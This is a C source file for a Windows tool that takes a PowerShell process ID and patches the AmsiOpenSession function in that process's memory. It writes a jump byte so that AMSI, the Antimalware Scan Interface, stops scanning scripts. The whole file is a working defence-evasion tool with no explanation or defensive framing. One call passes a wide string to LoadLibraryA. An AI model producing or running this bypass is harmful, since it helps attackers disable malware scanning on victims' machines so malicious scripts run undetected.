#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include "globals.h"


int main(int argc, char* argv[]) {


	DWORD pid = 0,
		oldProtect = 0;
	HANDLE hProcess = NULL;
	HMODULE loadLibraryDll = NULL;
	LPVOID amsiOpenSessionAddress = NULL,
		patchAddress = NULL;
	BYTE patch = 0xEB;

	if (argc != 2) {
		printf("(-) Usage: %s <PID>\n", argv[0]);
		return -1;
	}

	// Pass in PID of powershell session to program
	pid = (DWORD)atoi(argv[1]);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("\t(-) Failed to open PID \"%d\"\n", pid);
		return -1;
	}

	// Retreive a handle to amsi.dll
	printf("(+) Getting address of \"amsi.dll\" in target process\n");
	loadLibraryDll = LoadLibraryA(L"amsi.dll");
	if (loadLibraryDll == NULL) {
		printf("\t(-) Failed to get handle of \"amsi.dll\"\n");
		CloseHandle(hProcess);
		return -1;
	}


	// Get the address of the AmsiOpenSession fucntion using custom GetProcAddress
	printf("(+) Getting address of \"AmsiOpenSession\" function in \"amsi.dll\"\n");
	amsiOpenSessionAddress = GetProcAddressReplacement(loadLibraryDll, "AmsiOpenSession");
	if (amsiOpenSessionAddress == NULL) {
		printf("\t(-) Failed to get address of \"AmsiOpenSession\"\n");
		CloseHandle(hProcess);
		return -1;
	}

	// Calculating the correct patch address
	printf("(+) Getting the correct patch address\n\n");
	patchAddress = (LPVOID)((BYTE*)amsiOpenSessionAddress + 3);


	// Change memory protection to RWX
	printf("(+) Changing memory protection at 0x%p to RWX\n", patchAddress);
	if (!VirtualProtectEx(hProcess, patchAddress, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		printf("\t(-) Failed to change memory protection. Error: %d", GetLastError());
		FreeLibrary(loadLibraryDll); // FreeLibrary or CloseHandle??
		CloseHandle(hProcess);
		return -1;
	}

	// Patch address
	printf("\t(+) Patching address 0x%p\n", patchAddress);
	if (!WriteProcessMemory(hProcess, patchAddress, &patch, sizeof(patch), NULL)) {
		printf("\t\t(-) Failed to patch memory address. Error: %d", GetLastError());
		FreeLibrary(loadLibraryDll);
		CloseHandle(hProcess);
		return -1;
	}

	printf("\t\t(+) Memory patched successfully\n\n");

	printf("(+) Restoring old memory protection\n");
	if (!VirtualProtectEx(hProcess, patchAddress, 1, oldProtect, &oldProtect)) {
		printf("\t(-) Failed to change memory protection to old protection status. Error: %d", GetLastError());
		FreeLibrary(loadLibraryDll);
		return -1;
	}
	printf("\t(+) Old memory protection status has been changed\n");

	// Cleanup
	FreeLibrary(loadLibraryDll);
	CloseHandle(hProcess);
	return 0;
}